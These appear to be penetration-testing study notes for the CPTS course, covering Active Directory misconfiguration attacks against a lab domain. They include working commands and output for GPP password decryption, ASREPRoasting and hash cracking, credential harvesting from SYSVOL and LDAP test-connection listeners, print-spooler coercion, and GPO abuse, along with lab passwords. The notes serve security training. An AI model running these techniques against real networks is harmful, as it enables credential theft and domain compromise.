# ⚠️ Miscellaneous Misconfigurations

> [!info]  
> AD misconfigurations often hide outside the standard attack paths. Think broadly: **Exchange → authentication coercion → credential exposure → DNS → SYSVOL/GPP → Kerberos → GPOs**.

```text
ENUMERATE
    ↓
FIND MISCONFIGURATION
    ↓
VALIDATE ACCESS / PERMISSIONS
    ↓
OBTAIN CREDENTIALS OR COERCED AUTHENTICATION
    ↓
RELAY / CRACK / REUSE / ABUSE
    ↓
NEW ACCESS
    ↓
ENUMERATE AGAIN
```

---

## 🔐 Exchange-Related Group Membership

> [!important]  
> The `Exchange Windows Permissions` group can have significant rights over the domain object, including the ability to write a DACL. Abuse of this access can ultimately be used to grant **DCSync** rights.

### Exchange Windows Permissions

**What:** Exchange-related group that may have powerful permissions in AD.

**Look for:**

- User accounts in `Exchange Windows Permissions`
    
- Computer accounts in the group
    
- Support staff / remote-office power users
    
- Compromised accounts with rights to modify group membership
    
- DACL misconfigurations allowing membership changes
    

**Potential path:**

```text
Compromised account
      ↓
Add account to Exchange Windows Permissions
      ↓
Write DACL on domain object
      ↓
Grant DCSync rights
      ↓
Retrieve domain password hashes
```

[Exchange-AD-Privesc GitHub repository](https://github.com/gdedrouas/Exchange-AD-Privesc?utm_source=chatgpt.com)

### Organization Management

> [!warning]  
> `Organization Management` is effectively the highly privileged administrative group for Exchange and can access the mailboxes of domain users.

**Look for:**

- Domain administrators / sysadmins who are members
    
- Access to the `Microsoft Exchange Security Groups` OU
    
- Full control over Exchange-related groups
    
- Exchange servers as potential credential targets
    

```text
Compromise Exchange Server
        ↓
Credential material in memory
        ↓
Potential cleartext credentials / NTLM hashes
        ↓
Credential reuse
        ↓
Further domain access
```

> [!tip]  
> Exchange servers can contain significant credential material because users authenticate through services such as Outlook Web Access (OWA).

---

# 🔄 PrivExchange

> [!info]  
> PrivExchange abuses the Exchange `PushSubscription` feature to coerce an Exchange server into authenticating to an attacker-controlled host over HTTP.

### Attack Concept

```text
Authenticated Domain User
          ↓
     Exchange Server
          ↓
 PushSubscription abuse
          ↓
Exchange authenticates to attacker
          ↓
      NTLM relay
          ↓
       LDAP
          ↓
Potential DACL / privilege abuse
```

**Key conditions:**

- Domain user has a mailbox
    
- Exchange `PushSubscription` functionality is available
    
- Exchange service runs as `SYSTEM`
    
- Older Exchange configurations may have excessive domain permissions
    
- LDAP relay may allow domain-level privilege escalation
    

> [!important]  
> If LDAP relay is unavailable, the coerced authentication may still be useful for relaying to other services/hosts.

---

# 🖨️ Printer Bug — MS-RPRN

> [!info]  
> The Printer Bug abuses the Windows Print System Remote Protocol (`MS-RPRN`) to coerce a server's spooler service into authenticating to an attacker-controlled host over SMB.

### Attack Concept

```text
Domain User
    ↓
MS-RPRN / RpcOpenPrinter
    ↓
RpcRemoteFindFirstPrinterChangeNotificationEx
    ↓
Target Spooler
    ↓
SYSTEM authentication
    ↓
SMB / NTLM relay
    ↓
LDAP or another target
```

**What to look for:**

- Windows hosts running the Print Spooler service
    
- Domain Controllers / important servers running spooler
    
- Hosts vulnerable to authentication coercion
    
- Cross-domain / cross-forest trust scenarios
    

### Potential LDAP Relay Path

```text
Printer Bug
    ↓
Coerce SYSTEM authentication
    ↓
Relay authentication to LDAP
    ↓
Modify AD permissions
    ↓
Grant DCSync privileges
    ↓
Retrieve domain password hashes
```

### Potential RBCD Path

```text
Printer Bug
    ↓
Coerce authentication
    ↓
Relay to LDAP
    ↓
Configure RBCD
    ↓
Attacker-controlled computer account
    ↓
Authenticate as users on victim computer
```

### Cross-Forest Scenario

```text
FOREST A
   ↓
Compromise DC
   ↓
Coerce authentication
   ↓
FOREST TRUST
   ↓
FOREST B DC / vulnerable host
   ↓
Potential compromise
```

> [!warning]  
> Cross-forest abuse depends on the trust configuration. TGT delegation is no longer enabled by default.

### Enumerating MS-PRN Printer Bug

```powershell
Import-Module .\SecurityAssessment.ps1
```

Load the `SecurityAssessment.ps1` PowerShell module containing the `Get-SpoolStatus` function.

```powershell
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

Check whether the specified host is vulnerable to the Printer Bug.

```text
ComputerName                        Status
------------                        ------
ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL   True
```

`True` indicates that the host responded as vulnerable to the check.

[SecurityAssessment.ps1 GitHub repository](https://github.com/itzvenom/Security-Assessment-PS?utm_source=chatgpt.com)

[MS-PRN Printer Bug reference](https://blog.sygnia.co/demystifying-the-print-nightmare-vulnerability?utm_source=chatgpt.com)

---

# 🔐 MS14-068

> [!warning]  
> MS14-068 was a Kerberos vulnerability that allowed forged PAC information to be accepted as legitimate.

### Mental Model

```text
Normal Kerberos Ticket
        ↓
PAC contains user / group information
        ↓
KDC signs PAC
        ↓
Service trusts ticket

MS14-068
        ↓
Forge PAC
        ↓
Present privileged group membership
        ↓
KDC accepts forged PAC
        ↓
Potential Domain Admin privileges
```

**Key concept:**

- Kerberos tickets contain a **Privilege Attribute Certificate (PAC)**
    
- PAC contains information such as account identity and group membership
    
- The vulnerability allowed a forged PAC to be accepted
    
- Standard domain credentials could be used in the attack
    
- **Patching is the primary defense**
    

[PyKEK / MS14-068 repository](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek?utm_source=chatgpt.com)

---

# 🎯 Sniffing LDAP Credentials

> [!info]  
> Network devices, printers, and applications may store LDAP credentials in web administration interfaces. A connection-test feature can sometimes be abused to send those credentials to an attacker-controlled LDAP listener.

### Attack Flow

```text
Access Device / Application
          ↓
Find LDAP configuration
          ↓
Find "Test Connection"
          ↓
Change LDAP server → ATTACKER_IP
          ↓
Listen on TCP/389
          ↓
Device attempts LDAP connection
          ↓
Capture credentials
          ↓
Validate / reuse credentials
```

### Listener

```bash
nc -lvnp 389
```

Listen on LDAP port `389` and observe whether the device sends credentials when testing the connection.

> [!important]  
> Some applications may require a full LDAP server rather than a simple listener.

**Look for:**

- LDAP usernames
    
- Cleartext passwords
    
- Service accounts
    
- Privileged domain accounts
    
- Credentials that can be reused elsewhere
    

---

# 🌐 Enumerating AD DNS Records

> [!info]  
> AD-integrated DNS can reveal hostnames that normal enumeration may miss. This is particularly useful when hosts have non-descriptive names such as `SRV01934`.

### Why DNS Matters

```text
BloodHound / Network Enumeration
          ↓
SRV01934.INLANEFREIGHT.LOCAL
          ↓
Hostname gives little context
          ↓
Enumerate AD DNS
          ↓
JENKINS.INLANEFREIGHT.LOCAL
          ↓
Identify likely service
          ↓
Prioritize enumeration
```

[adidnsdump GitHub repository](https://github.com/dirkjanm/adidnsdump?utm_source=chatgpt.com)

### Dump DNS Records

```bash
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
```

Authenticate to the AD DNS zone and enumerate DNS records using a valid domain account.

```text
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[+] Found 27 records
```

### Review Results

```bash
head records.csv
```

Inspect the generated DNS record file.

```text
type,name,value
?,LOGISTICS,?
AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,ForestDnsZones,dead:beef::231
A,ForestDnsZones,10.129.202.29
A,ForestDnsZones,172.16.5.240
A,ForestDnsZones,172.16.5.5
AAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,DomainDnsZones,dead:beef::231
A,DomainDnsZones,10.129.202.29
```

`?` indicates a record that could not initially be resolved.

### Resolve Unknown Records

```bash
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
```

Use `-r` to attempt resolution of unknown records through an `A` query.

```bash
head records.csv
```

Review the records after resolution.

```text
type,name,value
A,LOGISTICS,172.16.5.240
AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,ForestDnsZones,dead:beef::231
A,ForestDnsZones,10.129.202.29
A,ForestDnsZones,172.16.5.240
A,ForestDnsZones,172.16.5.5
```

> [!tip]  
> Hidden DNS records can reveal service-specific hostnames and provide better targets for subsequent enumeration.

---

# 🔎 Other Misconfigurations

## 🔑 Passwords in Description Fields

> [!warning]  
> User `Description` and `Notes` fields sometimes contain passwords or other sensitive information.

### Search User Descriptions

```powershell
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
```

Enumerate user descriptions and display entries containing non-null descriptions.

```text
samaccountname description
-------------- -----------
administrator  Built-in account for administering the computer/domain
guest          Built-in account for guest access to the computer/domain
krbtgt         Key Distribution Center Service Account
ldap.agent     *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!
```

**Look for:**

- Passwords
    
- Password hints
    
- Service credentials
    
- Old credentials
    
- Connection strings
    
- Operational notes containing secrets
    

> [!tip]  
> For large environments, export the results to CSV and review them offline.

---

# 🚩 PASSWD_NOTREQD

> [!info]  
> `PASSWD_NOTREQD` in `userAccountControl` means the account is not subject to the current password policy's minimum password length requirement.

### Important Distinction

```text
PASSWD_NOTREQD
      ↓
Password may be shorter than policy
      ↓
OR password may still exist normally
      ↓
OR blank password may be possible
```

> [!warning]  
> `PASSWD_NOTREQD` **does not mean the account has no password**. It only means the normal password-length requirement does not apply.

**Possible causes:**

- Vendor software installation
    
- Legacy accounts
    
- Administrative configuration
    
- Accidental configuration
    
- Intentionally configured accounts
    

### Enumerate PASSWD_NOTREQD Accounts

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

Find domain accounts with the `PASSWD_NOTREQD` flag.

```text
samaccountname      useraccountcontrol
--------------      ------------------
guest               ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
mlowe               PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
ehamilton           PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
$725000-9jb50uejje9f ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
nagiosagent         PASSWD_NOTREQD, NORMAL_ACCOUNT
```

### Next Step

```text
Find PASSWD_NOTREQD account
          ↓
Check account status
          ↓
Test whether authentication works without a password
          ↓
If valid → enumerate accessible services
          ↓
If invalid → continue enumeration
```

---

# 📂 Credentials in SMB Shares & SYSVOL

> [!important]  
> `SYSVOL` is readable by authenticated domain users and may contain scripts, configuration files, legacy credentials, and other sensitive information.

### Enumerate SYSVOL Scripts

```powershell
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
```

List files in the domain's SYSVOL scripts directory.

```text
Mode   LastWriteTime        Length Name
----   -------------        ------ ----
-a---- 11/18/2021 10:44 AM     174 daily-runs.zip
-a----  2/28/2022  9:11 PM     203 disable-nbtns.ps1
-a----  3/7/2022   9:41 AM  144138 Logon Banner.htm
-a----  3/8/2022   2:56 PM     979 reset_local_admin_pass.vbs
```

**Look for:**

- `.vbs`
    
- `.ps1`
    
- `.bat`
    
- `.cmd`
    
- `.xml`
    
- Configuration files
    
- Scheduled-task scripts
    
- Password-reset scripts
    
- Service configuration
    

### Read Interesting Script

```powershell
cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
```

Read the contents of a suspicious script and search for hardcoded credentials.

```text
sUser = "Administrator"
sPwd = "!ILFREIGHT_L0cALADmin!"
```

**Potential workflow:**

```text
Find credential in SYSVOL
        ↓
Identify account type
        ↓
Determine whether credential is current
        ↓
Test password reuse
        ↓
Check SMB / WinRM / RDP / other services
        ↓
Enumerate newly accessible hosts
```

> [!tip]  
> Old scripts may contain disabled accounts or expired passwords, but password reuse can make apparently obsolete credentials valuable.

---

# 🔐 Group Policy Preferences — GPP Passwords

> [!info]  
> Older Group Policy Preferences can contain credentials in XML files stored within `SYSVOL`.

### Common GPP Files

|File|Purpose|
|---|---|
|`drives.xml`|Map network drives|
|`Groups.xml`|Create/manage local users and groups|
|`printers.xml`|Printer configuration|
|`services.xml`|Create/update services|
|`scheduledtasks.xml`|Scheduled tasks|
|`Registry.xml`|Registry-based configuration / autologon|

### GPP Password Concept

```text
GPP XML
   ↓
cpassword attribute
   ↓
AES-256 encrypted value
   ↓
Microsoft-published AES key
   ↓
Password can be decrypted
```

> [!warning]  
> Microsoft patched the ability to create new GPP password configurations in 2014, but existing XML files containing passwords can remain in `SYSVOL`.

> [!important]  
> Deleting a GPO instead of properly unlinking it can also leave cached copies on local computers.

### Decrypt `cpassword`

```bash
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```

Decrypt a GPP `cpassword` value.

```text
Password1
```

[Microsoft MS-GPPREF specification / AES key](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?utm_source=chatgpt.com)

[MS14-025 GPP vulnerability](https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30?utm_source=chatgpt.com)

### Find GPP Modules

```bash
crackmapexec smb -L | grep gpp
```

List CrackMapExec modules related to GPP.

```text
[*] gpp_autologin
    Searches the domain controller for registry.xml to find autologon information.

[*] gpp_password
    Retrieves plaintext passwords and other information for accounts pushed through Group Policy Preferences.
```

### Retrieve GPP Autologon Credentials

```bash
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```

Search the SYSVOL share for `Registry.xml` files containing autologon credentials.

```text
[+] Found SYSVOL share
[*] Searching for Registry.xml
[*] Found .../Machine/Preferences/Registry/Registry.xml
[+] Found credentials
Usernames: ['guarddesk']
Domains: ['INLANEFREIGHT.LOCAL']
Passwords: ['ILFreightguardadmin!']
```

**Potential workflow:**

```text
Find Registry.xml
       ↓
Recover username + password
       ↓
Identify whether account is local/domain
       ↓
Test credential on accessible hosts
       ↓
Check for local admin privileges
       ↓
Enumerate host
       ↓
Hunt for additional credentials
```

> [!important]  
> GPP credentials may belong to legacy, locked, deleted, or expired accounts. **Password reuse** can still make the recovered password useful against other accounts or hosts.

---

# 🔥 Credential Reuse — Always Retest

Whenever credentials are discovered:

```text
NEW CREDENTIAL
      ↓
What account?
      ↓
Domain or local?
      ↓
Where can it authenticate?
      ↓
SMB / WinRM / RDP / LDAP / Other
      ↓
Valid?
   ┌──┴──┐
  YES    NO
   ↓      ↓
Enumerate  Try another
   ↓       service / host
New data
   ↓
Repeat
```

> [!important]  
> Treat every recovered credential as a **new enumeration opportunity**, not simply as a one-time login.

---

# 🔥 ASREPRoasting

> [!info]  
> ASREPRoasting targets accounts configured with **Do not require Kerberos pre-authentication**. An attacker can request an AS-REP and attempt to crack the returned material offline.

### Kerberos Comparison

|Attack|Target|Requirement|Offline cracking|
|---|---|---|---|
|Kerberoasting|TGS-REP|SPN|Yes|
|ASREPRoasting|AS-REP|`DONT_REQ_PREAUTH`|Yes|

> [!important]  
> An SPN is **not required** for ASREPRoasting.

### Mental Model

```text
Normal Kerberos
      ↓
User proves knowledge of password
      ↓
Pre-authentication
      ↓
KDC issues TGT

DONT_REQ_PREAUTH
      ↓
No pre-authentication
      ↓
Request AS-REP
      ↓
Encrypted with account password
      ↓
Capture AS-REP
      ↓
Offline password cracking
```

---

## 🔎 Enumerate ASREPRoastable Users

### PowerView

```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

Find users whose account configuration contains `DONT_REQ_PREAUTH`.

```text
samaccountname     : mmorgan
userprincipalname  : mmorgan@inlanefreight.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```

### Rubeus

```powershell
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```

Request the AS-REP for the specified user and output it in Hashcat format.

> [!tip]  
> `/nowrap` prevents the ticket/hash from being column-wrapped, making it easier to feed directly into Hashcat.

```text
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:...
```

### Crack with Hashcat

```bash
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
```

Crack the AS-REP hash offline using Hashcat mode `18200`.

```text
Hash.Name........: Kerberos 5, etype 23, AS-REP
Status...........: Cracked
...
:Welcome!00
```

> [!important]  
> ASREPRoasting is an **offline attack**. The password strength of the affected account determines whether cracking succeeds.

---

## 🔎 ASREPRoasting with Kerbrute

```bash
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

Enumerate valid domain usernames and automatically identify users that do not require Kerberos pre-authentication.

```text
[+] VALID USERNAME:   sbrown@inlanefreight.local
[+] VALID USERNAME:   jjones@inlanefreight.local
...
[+] mmorgan has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:...
```

> [!tip]  
> Kerbrute can combine **user enumeration + AS-REP discovery** in one step.

---

## 🔎 ASREPRoasting with Impacket

```bash
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
```

Test a list of known valid users for `UF_DONT_REQUIRE_PREAUTH` and return AS-REP hashes in Hashcat format where applicable.

```text
[-] User sbrown@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
...
$krb5asrep$23$mmorgan@inlanefreight.local@INLANEFREIGHT.LOCAL:...
...
```

> [!important]  
> This attack does **not** require the attacker to be on a domain-joined machine.

### ASREPRoasting Decision Flow

```text
Have valid usernames?
        │
       YES
        ↓
Check DONT_REQ_PREAUTH
        │
   ┌────┴────┐
  FOUND    NONE
   │          │
   ↓          ↓
Request      Continue
AS-REP       enumeration
   │
   ↓
Format for Hashcat
   │
   ↓
Offline crack
   │
   ↓
Password recovered?
   ┌────┴────┐
  YES        NO
   │          │
   ↓          ↓
Validate    Report finding
credential  + continue
   │
   ↓
Enumerate services
```

### ASREPRoasting from Windows vs Linux

|Approach|Platform|Main purpose|
|---|---|---|
|PowerView|Windows|Enumerate `DONT_REQ_PREAUTH` users|
|Rubeus|Windows|Request AS-REP in Hashcat format|
|Kerbrute|Linux / Windows|Enumerate users + identify AS-REP candidates|
|`GetNPUsers.py`|Linux|Hunt users without Kerberos pre-authentication|
|Hashcat|Linux / Windows|Offline crack AS-REP hashes|

[Rubeus GitHub repository](https://github.com/GhostPack/Rubeus?utm_source=chatgpt.com)

[Impacket GitHub repository](https://github.com/fortra/impacket?utm_source=chatgpt.com)

---

# 🛡️ GenericWrite / GenericAll → ASREPRoasting

> [!important]  
> If an attacker has `GenericWrite` or `GenericAll` over a user, the account's pre-authentication setting can potentially be modified to enable AS-REP roasting.

### Attack Concept

```text
GenericWrite / GenericAll
          ↓
Target user
          ↓
Enable DONT_REQ_PREAUTH
          ↓
Request AS-REP
          ↓
Offline crack
          ↓
Recover password
          ↓
Disable the setting again
```

> [!warning]  
> The success of the attack still depends on the target account having a crackable password.

---

# ⚙️ Group Policy Object Abuse

> [!info]  
> GPOs can control user and computer configuration across entire OUs. An attacker who gains sufficient rights over a GPO may be able to execute actions across every affected host.

### Potential Abuse

```text
ACL Misconfiguration
        ↓
Rights over GPO
        ↓
Modify GPO
        ↓
GPO applies to OU
        ↓
Affected computers/users
        ↓
Code / privilege / account changes
```

**Possible actions:**

- Add users to local Administrators
    
- Grant rights such as:
    
    - `SeDebugPrivilege`
        
    - `SeTakeOwnershipPrivilege`
        
    - `SeImpersonatePrivilege`
        
- Create immediate scheduled tasks
    
- Execute commands
    
- Create malicious startup scripts
    
- Establish persistence
    

---

## 🔎 Enumerate GPOs with PowerView

```powershell
Get-DomainGPO | select displayname
```

Enumerate GPO names in the domain.

```text
displayname
-----------
Default Domain Policy
Default Domain Controllers Policy
Deny Control Panel Access
Disallow LM Hash
Deny CMD Access
Disable Forced Restarts
Block Removable Media
Disable Guest Account
Service Accounts Password Policy
Logon Banner
Disconnect Idle RDP
Disable NetBIOS
AutoLogon
GuardAutoLogon
Certificate Services
```

**What this can reveal:**

- Security restrictions
    
- Password policies
    
- Autologon configuration
    
- Disabled functionality
    
- Certificate Services / AD CS presence
    
- Potentially interesting GPOs for further enumeration
    

---

## 🔎 Enumerate GPOs with Built-in PowerShell

```powershell
Get-GPO -All | Select DisplayName
```

List all GPOs using the built-in Group Policy PowerShell module.

---

## 🔐 Check Domain Users' GPO Rights

```powershell
$sid=Convert-NameToSid "Domain Users"
```

Convert the `Domain Users` group name into its SID.

```powershell
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```

Search GPO ACLs for permissions assigned to the `Domain Users` SID.

```text
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty,
                        Delete, GenericExecute, WriteDacl, WriteOwner
SecurityIdentifier    : S-1-5-21-...-513
```

> [!important]  
> Permissions such as `WriteProperty`, `WriteDacl`, and `WriteOwner` may allow an attacker to obtain greater control over the GPO.

---

## 🔎 Convert GPO GUID → Name

```powershell
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```

Resolve a GPO GUID to its display name and configuration details.

```text
DisplayName : Disconnect Idle RDP
DomainName  : INLANEFREIGHT.LOCAL
Owner       : INLANEFREIGHT\Domain Admins
Id          : 7ca9c789-14ce-46e3-A722-83F4097AF532
GpoStatus   : AllSettingsEnabled
```

### GPO Attack Chain

```text
Find GPO
   ↓
Identify ACL
   ↓
Can controlled account modify GPO?
   ↓
YES
   ↓
Identify affected OU
   ↓
Identify computers/users in OU
   ↓
Choose controlled-impact modification
   ↓
Apply GPO
   ↓
Gain privilege / execute action
```

---

# 🩸 BloodHound — GPO Analysis

[BloodHound Quickstart](https://heretek.dev/tools/bloodhound-quickstart/?utm_source=chatgpt.com)

Use BloodHound to identify:

- Users/groups with rights over GPOs
    
- `GenericWrite`
    
- `WriteOwner`
    
- `WriteDacl`
    
- GPO → OU relationships
    
- GPO → affected computers
    
- Potential attack paths
    

### GPO Relationship

```text
DOMAIN USERS
     │
     │ WriteDacl / GenericWrite / WriteOwner
     ↓
DISCONNECT IDLE RDP
     │
     │ GpLink
     ↓
APPLICATION OU
     │
     ├── COMPUTER 1
     ├── COMPUTER 2
     ├── COMPUTER 3
     └── COMPUTER 4
```

> [!important]  
> **Affected Objects** in BloodHound can reveal which OU and therefore which computers/users receive the GPO.

---

# 🛠️ SharpGPOAbuse

[SharpGPOAbuse GitHub repository](https://github.com/FSecureLABS/SharpGPOAbuse?utm_source=chatgpt.com)

A tool for abusing writable GPOs to perform actions such as:

- Add a controlled user to local Administrators
    
- Create an immediate scheduled task
    
- Configure startup scripts
    
- Execute commands on affected systems
    

### GPO Abuse Mental Model

```text
Writable GPO
     ↓
GPO linked to OU
     ↓
Find affected hosts
     ↓
Choose desired modification
     ↓
Modify GPO
     ↓
Policy reaches affected systems
     ↓
Privilege / execution / persistence
```

> [!warning]  
> **Scope matters.** A GPO may apply to every computer in an OU. If an editable GPO affects 1,000 systems, an indiscriminate modification could impact all 1,000.

```text
Writable GPO
      ↓
How many affected hosts?
      ↓
┌─────┴──────┐
│            │
Few         Many
│            │
↓            ↓
Targeted    Carefully
modification scope impact
```

> [!tip]  
> When the abuse tool supports specifying a target user or host, use the narrowest scope necessary for the objective.

---

# 🧠 CPTS Decision Map — Miscellaneous AD Misconfigurations

```text
                    AD ENUMERATION
                          │
          ┌───────────────┼────────────────┐
          ↓               ↓                ↓
      Exchange          DNS             SYSVOL
          │               │                │
          ↓               ↓                ↓
   Exchange groups    Hidden hosts      Scripts
          │               │                │
          ↓               ↓                ↓
   PrivExchange       Services          Passwords
          │                                │
          ↓                                ↓
   Coerce / Relay                         GPP
          │                                │
          ↓                                ↓
     LDAP abuse                       cpassword
          │                                │
          └───────────────┬────────────────┘
                          ↓
                    CREDENTIALS
                          │
          ┌───────────────┼────────────────┐
          ↓               ↓                ↓
    Description     PASSWD_NOTREQD    ASREPRoast
          │               │                │
          └───────────────┼────────────────┘
                          ↓
                  VALIDATE / REUSE
                          │
                          ↓
              SMB / WinRM / RDP / LDAP
                          │
                          ↓
                  ENUMERATE AGAIN
```

---

# 🧠 GPO Attack Decision Flow

```text
Find interesting GPO
        ↓
Who can modify it?
        ↓
Controlled account has
WriteDacl / WriteOwner / GenericWrite?
        ↓
      YES
        ↓
Which OU is the GPO linked to?
        ↓
Which hosts are affected?
        ↓
Choose controlled modification
        ↓
Privilege escalation / execution / persistence
        ↓
Enumerate newly controlled host
```

---

# 🧠 Credential Discovery Decision Flow

```text
Find credentials
      ↓
Where did they come from?
      │
 ┌────┼──────────────┬───────────────┐
 ↓    ↓              ↓               ↓
SYSVOL GPP      LDAP console    Description
 ↓       ↓            ↓               ↓
Password / cpassword / cleartext
      │
      ↓
Identify account
      ↓
Domain or local?
      ↓
Check password reuse
      ↓
SMB / WinRM / RDP / Other
      ↓
Valid access?
   ┌──┴──┐
  YES    NO
   ↓      ↓
Enumerate  Continue
   ↓
Find new credentials
   ↓
Repeat
```

---

# 🧠 ASREPRoasting Mental Model

```text
VALID USERNAMES
      ↓
DONT_REQ_PREAUTH?
      ↓
REQUEST AS-REP
      ↓
HASHCAT / JOHN
      ↓
PASSWORD
      ↓
VALIDATE CREDENTIAL
      ↓
ACCESS SERVICE
      ↓
ENUMERATE HOST
      ↓
REUSE CREDENTIAL
```

---

# 🧠 Miscellaneous Misconfiguration Workflow

```text
🔎 ENUMERATE AD
      ↓
Exchange groups?
      ↓
DNS records?
      ↓
SYSVOL scripts?
      ↓
GPP / Registry.xml?
      ↓
Description fields?
      ↓
PASSWD_NOTREQD?
      ↓
DONT_REQ_PREAUTH?
      ↓
Writable GPO?
      ↓
Printer Spooler?
      ↓
Exchange coercion?
      ↓
LDAP credential exposure?
      ↓
VALIDATE FINDING
      ↓
CREDENTIAL / ACCESS / PRIVILEGE
      ↓
ENUMERATE AGAIN
```

---

# 🎯 Key Takeaways

- **Exchange-related groups** can provide unexpectedly powerful AD permissions.
    
- `Exchange Windows Permissions` may allow domain-object DACL modification and potential DCSync abuse.
    
- `Organization Management` provides extremely powerful Exchange privileges.
    
- **PrivExchange** abuses Exchange authentication coercion and can be combined with NTLM relay.
    
- **Printer Bug / MS-RPRN** can coerce SYSTEM authentication and potentially be combined with LDAP relay.
    
- **MS14-068** involved forged Kerberos PAC information and is mitigated through patching.
    
- LDAP-connected applications and printers may expose **privileged LDAP credentials**.
    
- AD-integrated DNS can reveal **hidden or descriptive hostnames** that improve attack targeting.
    
- Always inspect **user descriptions and notes** for accidentally stored credentials.
    
- `PASSWD_NOTREQD` means the normal password-length requirement does not apply; it **does not automatically mean the account has no password**.
    
- `SYSVOL` should always be inspected for scripts and configuration files containing credentials.
    
- Legacy **GPP passwords** may remain in SYSVOL even after the original functionality was patched.
    
- `Registry.xml` may expose **autologon credentials in cleartext**.
    
- Recovered credentials should always trigger **credential-reuse testing**.
    
- **ASREPRoasting** targets accounts with `DONT_REQ_PREAUTH` and does not require an SPN.
    
- AS-REP hashes can be cracked offline with **Hashcat mode `18200`**.
    
- ASREPRoasting can be performed without being on a domain-joined machine.
    
- `GenericWrite` / `GenericAll` over a user can potentially enable an ASREPRoasting path.
    
- **GPO ACLs** can provide a path to privilege escalation, lateral movement, execution, or persistence.
    
- Always determine the **scope of a GPO** before modifying it.
    
- The core CPTS mindset is:
    

```text
FIND SOMETHING INTERESTING
          ↓
UNDERSTAND WHAT IT CONTROLS
          ↓
VALIDATE THE PERMISSION / CREDENTIAL
          ↓
ABUSE IT
          ↓
GAIN ACCESS
          ↓
ENUMERATE AGAIN
          ↓
REPEAT
```